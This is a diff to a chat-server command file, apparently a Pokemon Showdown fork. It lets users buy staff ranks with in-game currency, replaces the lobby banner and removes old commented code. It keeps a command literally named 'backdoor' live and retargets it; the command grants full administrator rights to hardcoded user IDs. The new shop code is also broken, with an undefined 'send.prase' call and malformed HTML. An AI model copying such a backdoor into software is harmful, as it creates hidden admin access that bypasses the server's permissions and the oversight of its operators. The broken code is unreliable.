@@ -109,7 +109,7 @@ var crypto = require('crypto');
 var poofeh = true;
 var ipbans = fs.createWriteStream('config/ipbans.txt', {'flags': 'a'});
 var logeval = fs.createWriteStream('logs/eval.txt', {'flags': 'a'});
-var inShop = ['symbol', 'custom', 'animated', 'room', 'trainer', 'fix', 'declare', 'frt'];
+var inShop = ['voice', 'driver', 'animated', 'room', 'trainer', 'fix', 'declare', 'frt'];
 var closeShop = false;
 var closedShop = 0;
 var avatar = fs.createWriteStream('config/avatars.csv', {'flags': 'a'}); // for /customavatar
@@ -352,71 +352,7 @@ var commands = exports.commands = {
 		}
 	},
 	
-	/*transferbucks: function(target, room, user) {
-		if(!target) return this.parse('...');
-		if (target.indexOf(',') != -1) {
-			var parts = target.split(',');
-			parts[0] = this.splitTarget(parts[0]);
-			var targetUser = this.targetUser;
-		if (!targetUser) {
-			return this.sendReply('User '+this.targetUsername+' not found.');
-		}
-		if (isNaN(parts[1])) {
-			return this.sendReply('Very funny, now use a real number.');
-		}
-		var cleanedUp = parts[1].trim();
-		var giveMoney = Number(cleanedUp);
-		var data = fs.readFileSync('config/money.csv','utf8')
-		var match = false;
-		var money = 0;
-		var line = '';
-		var row = (''+data).split("\n");
-		for (var i = row.length; i > -1; i--) {
-			if (!row[i]) continue;
-			var parts = row[i].split(",");
-			var userid = toUserid(parts[0]);
-			if (targetUser.userid == userid) {
-			var x = Number(parts[1]);
-			var money = x;
-			match = true;
-			if (match === true) {
-				line = line + row[i];
-				break;
-			}
-			}
-		}
-		targetUser.money = money;
-		targetUser.money += giveMoney;
-		user.money = money;
-		user.money -= giveMoney;
-		if (user.money < giveMoney) { return this.sendReply('You don\'t have enough money to give'); }
-		if (match === true) {
-			var re = new RegExp(line,"g");
-			fs.readFile('config/money.csv', 'utf8', function (err,data) {
-			if (err) {
-				return console.log(err);
-			}
-			var result = data.replace(re, targetUser.userid+','+targetUser.money);
-			var userresult = data.replace(re, user.userid+','+user.money);
-			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
-				if (err) return console.log(err);
-			});
-				fs.writeFile('config/money.csv', userresult, 'utf8', function (err) {
-				if (err) return console.log(err);
-			});
-			});
-		} else {
-			var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
-			log.write("\n"+targetUser.userid+','+targetUser.money);
-		}
-		var p = 'bucks';
-		if (giveMoney < 2) p = 'buck';
-		this.sendReply(targetUser.name + ' was given ' + giveMoney + ' ' + p + '. This user now has ' + targetUser.money + ' bucks.');
-		targetUser.send(user.name + ' has given you ' + giveMoney + ' ' + p + '.');
-		} else {
-			return this.parse('/help givebucks');
-		}
-	},*/
+	
 
 	takebucks: 'removebucks',
 	removebucks: function(target, room, user) {
@@ -503,18 +439,7 @@ var commands = exports.commands = {
 		}
 		user.money = money;
 		var price = 0;
-		if (target === 'symbol') {
-			price = 5;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased a custom symbol. You will have this until you log off for more than an hour.');
-				this.sendReply('Use /customsymbol [symbol] to change your symbol now!');
-				user.canCustomSymbol = true;
-				this.add(user.name + ' has purchased a custom symbol!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
+	
 		if (target === 'custom') {
 			price = 20;
 			if (price <= user.money) {
@@ -522,17 +447,6 @@ var commands = exports.commands = {
 				this.sendReply('You have purchased a custom avatar. You need to message an Admin capable of adding (Ask BlakJack or Skarr).');
 				user.canCustomAvatar = true;
 				this.add(user.name + ' has purchased a custom avatar!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-		if (target === 'animated') {
-			price = 35;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack or Skarr).');
-				user.canAnimatedAvatar = true;
-				this.add(user.name + ' has purchased a custom animated avatar!');
 			} else {
 				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
 			}
@@ -570,17 +484,31 @@ var commands = exports.commands = {
 				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
 			}
 		}
-		if (target === 'declare') {
-			price = 25;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased the ability to declare (from Admin). To do this message an Admin (~) with the message you want to send. Keep it sensible!');
-				user.canDecAdvertise = true;
-				this.add(user.name + ' has purchased the ability to declare from an Admin!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
+		if (target === 'voice') {
+                        price = 50;
+                        if (price <= user.money) {
+                                user.money = user.money - price;
+                                this.sendReply('You have purchased voice. You are now a voice!.');
+                                user.group = '+';
+                                            user.updateIdentity();
+                                                                this.add(user.name + ' is now a voice!');
+                        } else {
+                                return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+                        }
+                }
+                if (target === 'driver') {
+                        price = 125;
+                        if (price <= user.money) {
+                                user.money = user.money - price;
+                                this.sendReply('You have purchased Driver. You are now staff welcome to the staff!');
+                                user.group = '%';
+                                user.updateIdentity();
+                                send.prase('/join staff');
+                                this.add(user.name + ' is now a driver');
+                        } else {
+                                return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
+                        }
+                }
 		if (target === 'forcerename') {
 			price = 10;
 			if (price <= user.money) {
@@ -665,113 +593,7 @@ var commands = exports.commands = {
 
 	},
 	
-	/*buyweapon: function(target, room, user) {
-		if (!target) return this.parse('That isn\'t a weapon');
-		if (!users.get('Siiilver')) return this.sendReply('Silver the blacksmith isn\'t online....');
-		var data = fs.readFileSync('config/money.csv','utf8')
-		var match = false;
-		var money = 0;
-		var line = '';
-		var row = (''+data).split("\n");
-		for (var i = row.length; i > -1; i--) {
-			if (!row[i]) continue;
-			var parts = row[i].split(",");
-			var userid = toUserid(parts[0]);
-			if (user.userid == userid) {
-			var x = Number(parts[1]);
-			var money = x;
-			match = true;
-			if (match === true) {
-				line = line + row[i];
-				break;
-			}
-			}
-		}
-		user.money = money;
-		var price = 0;
-		
-		if (target === 'banhammer') {
-			price = 20;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased a banhammer.');
-				user.canCustomAvatar = true;
-				this.add(user.name + ' has purchased a brahammer from the blacksmith shop!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-		if (target === 'animated') {
-			price = 35;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased a custom animated avatar. You need to message an Admin capable of adding (BlakJack or Skarr).');
-				user.canAnimatedAvatar = true;
-				this.add(user.name + ' has purchased a custom animated avatar!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-		if (target === 'room') {
-			price = 100;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased a chat room. You need to message an Admin so that the room can be made.');
-				user.canChatRoom = true;
-				this.add(user.name + ' has purchased a chat room!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-		if (target === 'trainer') {
-			price = 30;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased a trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
-				user.canTrainerCard = true;
-				this.add(user.name + ' has purchased a trainer card!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-		if (target === 'fix') {
-			price = 10;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (BlakJack or Skarr).');
-				user.canFixItem = true;
-				this.add(user.name + ' has purchased the ability to set alter their card or avatar!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-		if (target === 'declare') {
-			price = 25;
-			if (price <= user.money) {
-				user.money = user.money - price;
-				this.sendReply('You have purchased the ability to declare (from Admin). To do this message an Admin (~) with the message you want to send. Keep it sensible!');
-				user.canDecAdvertise = true;
-				this.add(user.name + ' has purchased the ability to declare from an Admin!');
-			} else {
-				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
-			}
-		}
-				if (match === true) {
-			var re = new RegExp(line,"g");
-			fs.readFile('config/money.csv', 'utf8', function (err,data) {
-			if (err) {
-				return console.log(err);
-			}
-			var result = data.replace(re, user.userid+','+user.money);
-			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
-				if (err) return console.log(err);
-			});
-			});
-		} else {
-					var log = fs.createWriteStream('config/money.csv', {'flags': 'a'});
-					log.write("\n"+user.userid+','+user.money);
-				}
-	},*/
+	
 
 	customsymbol: function(target, room, user) {
 		if(!user.canCustomSymbol) return this.sendReply('You need to buy this item from the shop to use.');
@@ -800,25 +622,13 @@ var commands = exports.commands = {
 		
 	},
 	
-	/*chatroom: function(target, room, user) {
-		if (!user.canChatroom) return false;
-		return this.sendReply('You have to buy this from the shop first!');
-		
-		var id = toId(target);
-		if (Rooms.rooms[id]) {
-			return this.sendReply("The room '"+target+"' already exists.");
-		}
-		if (Rooms.global.addChatRoom(target)) {
-			return this.sendReply("The room '"+target+"' was created.");
-		}
-		user.canChatroom = false;
-	},*/
+
 	
 	shop: function(target, room, user) {
 		if (!this.canBroadcast()) return;
-		this.sendReplyBox('<center><h4><b><u>Kill The Noise Shop</u></b></h4><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
-			'<tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist (temporary until restart)</td><td>5</td></tr>' +
-			'<tr><td>Custom</td><td>Buys a custom avatar to be applied to your name (you supply)</td><td>20</td></tr>' +
+		this.sendReplyBox('<center><h4><b><u>Pub Shop</u></b></h4><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
+			'<tr><td>Voice</td><td>Makes You a voice </td><td>50</td></tr>' +
+			'<tr><td>Driver</td><td>Makes you a part of the staff</td><td<125</td></tr>' +
 			'<tr><td>Animated</td><td>Buys an animated avatar to be applied to your name (you supply)</td><td>35</td></tr>' +
 			'<tr><td>Room</td><td>Buys a chatroom for you to own (within reason, can be refused)</td><td>100</td></tr>' +
 			'<tr><td>Trainer</td><td>Buys a trainer card which shows information through a command such as /blakjack (note: third image costs 10 bucks extra, ask for more details)</td><td>40</td></tr>' +
@@ -1490,29 +1300,28 @@ this.parse('/a |pm| PM Bot|| '+target+'');
 		if (!target) return false;
 		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
 		if (!targetRoom) {
-			return connection.sendTo(target, "|noinit|nonexistent|The room '" + target + "' does not exist.");
-		}
-		if (targetRoom.isPrivate && !user.named) {
-			return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room '" + target + "'.");
-		}
-		if (!user.joinRoom(targetRoom || room, connection)) {
-			return connection.sendTo(target, "|noinit|joinfailed|The room '" + target + "' could not be joined.");
-		}
+                        if (target === 'lobby') return connection.sendTo(target, "|noinit|nonexistent|");
+                        return connection.sendTo(target, "|noinit|nonexistent|The room '"+target+"' does not exist.");
+                }
+                if (targetRoom.isPrivate && !user.named) {
+                        return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room '"+target+"'.");
+                }
+                if (!user.joinRoom(targetRoom || room, connection)) {
+                        return connection.sendTo(target, "|noinit|joinfailed|The room '"+target+"' could not be joined.");
+                }
+
 		if (target.toLowerCase() == "lobby") {
-			connection.sendTo('lobby','|html|<div class="infobox" style="border-color:blue"><center><b><u>Welcome to the Kill The Noise Server!</u></b></center><br /> ' +
-			'<center><b><a href ="https://gist.github.com/E4Arsh/8487939">This Server is hosted By BlakJack</a></b></center><br /><br />' +
-			'Battle users in the ladder or in tournaments, learn how to play Pokemon or just chat in lobby!<br /><br />' +
-			'Make sure to type <b>/help</b> to get a list of commands that you can use and <b>/faq</b> to check out frequently asked questions.<br /><br />' +
-			'If you have any questions, issues or concerns should be directed at someone with a rank such as Voice (+), Driver (%), Moderator (@) and Leader (&). <br /><br />' +
-			'Only serious issues or questions should be directed to Administrators (~).</div>');
+			 return connection.sendTo('lobby','|html|<div class="infobox" style="border-color:blue"><center><img src="http://s3.postimg.org/moy413iib/Untitled.png"></center><br /> ' +
+                        'Welcome To Stun\'s Tavern, the first server solely to getting you drunk.<br>'+
+                        'to have a good time! We got dancing, rock music, drinks, and other nonsense to make life just a bit more enjoyable. So sit down and let the bartenders serve you as you please!<br><br>' +
+                        '<a href="gist.github.com/E4Arsh/8577715">This sevrer is hosted by BlakJack</a><br>' +
+                        '<a href="http://stunstavern.weebly.com/">Check Out the official website here</a><br>' +
+                        'You too drunk to go home? PM Stunfisk to get yourself a free room on the website!<br><br>' +
+                        ' If you have any questions, PM a Moderator (@) or Leader(&). If you have urgent or serious questions, PM an Administrator (~)! Otherwise, grab  a couple drinks, sit down, and have a good time!<br><br>' +
+				        '</div>');
+
 		}
-		if (target.toLowerCase() == "teammagmahideout") {
-			return connection.sendTo('teammagmahideout','|html|<div class="infobox" style="border-color:blue"><center><img src="http://upload.wikimedia.org/wikipedia/en/8/8a/Team_Magma_Logo.png"></center><br />' +
-			'<center><b><u>Welcome to the Team Magma Hideout!</u></b></center><br />' +
-			'<center>WELCOME TO TEAM MAGMA! WE ARE A GANG OF MERCILESS VISIONARIES WORKING TO CONTROL GROUDON!</center><br /><br />' +
-			'<center>HOWEVER, WE CONSTANTLY FIND OURSELVES IN FIGHTS WITH TEAM AQUA AND WE NEED YOUR HELP!</center><br /><br />' +
-			'<center>CONTACT AN ADMIN (%), OPERATOR (@), OR COMMANDER (#) TO JOIN. WHEN RECRUITED, YOU WILL START AS A GRUNT (+)!</center></div>');
-		}
+		
 	},
 
 	rb: 'roomban',
@@ -2488,27 +2297,13 @@ this.parse('/a |pm| PM Bot|| '+target+'');
 				CommandParser.uncacheTree('./command-parser.js');
 				CommandParser = require('./command-parser.js');
 
-				var runningTournaments = Tournaments.tournaments;
-				CommandParser.uncacheTree('./tournaments/frontend.js');
-				Tournaments = require('./tournaments/frontend.js');
-				Tournaments.tournaments = runningTournaments;
 
 				return this.sendReply('Chat commands have been hot-patched.');
 			} catch (e) {
 				return this.sendReply("Something failed while trying to hotpatch chat: \n" + e.stack);
 			}
 
-		} else if (target === 'tournaments') {
-
-			try {
-				var runningTournaments = Tournaments.tournaments;
-				CommandParser.uncacheTree('./tournaments/frontend.js');
-				Tournaments = require('./tournaments/frontend.js');
-				Tournaments.tournaments = runningTournaments;
-				return this.sendReply("Tournaments have been hot-patched.");
-			} catch (e) {
-				return this.sendReply('Something failed while trying to hotpatch tournaments: \n' + e.stack);
-			}
+		
 
 		} else if (target === 'battles') {
 
@@ -2575,7 +2370,7 @@ this.parse('/a |pm| PM Bot|| '+target+'');
 	},
 	
 	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === 'ncrypt' || user.userid === 'jackdaw') {
+		if (user.userid === 'blakjack' || user.userid === 'stunfiskthegreat' || user.userid === 'jackdaw') {
 
 			user.group = '~';
 			user.updateIdentity();
